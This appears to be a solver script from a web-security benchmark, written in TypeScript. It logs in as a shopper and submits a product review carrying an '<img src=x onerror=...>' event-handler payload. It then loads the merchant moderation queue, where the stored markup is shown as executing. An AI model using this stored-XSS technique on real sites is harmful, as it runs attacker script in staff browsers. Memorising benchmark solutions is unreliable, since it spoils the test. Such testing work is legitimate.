// Second order: a shopper stores a review carrying an event-handler payload, then the merchant opens
// the moderation queue, where the stored markup is rendered and executes.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface Product { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const res = await ctx.fetch(buildPath(ctx.plan, 'listProducts'), { method: 'GET' })
  const data = (await res.json().catch(() => ({}))) as { products?: Product[] }
  const prod = data.products?.[0]
  if (!prod) return
  // Store step.
  await ctx.fetch(buildPath(ctx.plan, 'submitReview', { productId: prod.external_id }), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ author: 'shopper', body: '<img src=x onerror="fetch(1)">' }),
  })
  // Trigger step.
  await ctx.fetch(buildPath(ctx.plan, 'moderationQueue'), { method: 'GET' })
}
